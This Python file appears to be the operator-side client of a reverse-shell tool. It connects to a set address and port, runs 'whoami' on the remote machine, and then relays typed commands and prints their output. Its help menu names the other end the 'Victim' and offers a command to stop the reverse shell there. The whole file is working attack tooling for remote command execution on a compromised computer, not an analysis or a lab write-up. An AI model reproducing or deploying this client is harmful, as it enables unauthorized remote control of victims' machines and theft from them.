from colorama import Fore
import socket
import time
import sys
import os

server_ip = '127.0.0.1'
server_port = 34567

victim = f'{Fore.LIGHTRED_EX}Victim{Fore.RESET}'
pipe = f'{Fore.LIGHTBLUE_EX} | {Fore.RESET}'

commands = f'''
help{pipe}Prints this menu
cls - clear{pipe}Clears this console
stop{pipe}Stops the reverse shell on {victim}
exit - close{pipe}Closes this client and connection
ping{pipe}Gives you the TCP connect latency between you and the {victim}
'''

def ping():
    pings = []
    for i in range(5):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        start = time.time()
        try:
            s.connect((server_ip, server_port))
            end = time.time()
            rtt = (end - start) * 1000
            pings.append(rtt)
        except Exception:
            print(f"{server_ip} is unreachable.")
        finally:
            s.close()
    if pings:
        avg = sum(pings) / len(pings)
        print(f"Average ping: {avg:.2f} ms")
    else:
        print("No TCP replies received.")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    sock.sendall(b'whoami')
    response = sock.recv(1024).decode().replace("\r\n", "")
    if '\\' in response:
        parts = response.split('\\')
        desktop = parts[0]
        user = parts[1]
        input_text = f'[{user}@{desktop}] > '
    else:
        input_text = f'[{response}] > '

    
    while True:
        command = input(input_text).strip()
        if not command:
            continue
        
        if command in ('cls', 'clear'):
            os.system('cls' if os.name == 'nt' else 'clear')
            continue

        if command == 'ping':
            ping()
            continue
        
        if command == 'help':
            print(commands)
            continue
        
        if command in ('exit', 'close'):
            sock.close()
            break
        
        sock.sendall(command.encode())
        
        result = b""
        while True:
            data = sock.recv(1024)
            if not data:
                break
            result += data
            if len(data) < 1024:
                break
        
        print(result.decode())
        
except KeyboardInterrupt:
    try:
        sock.close()
    except:
        pass
    sys.exit()
except Exception as e:
    print(e)
    sys.exit()
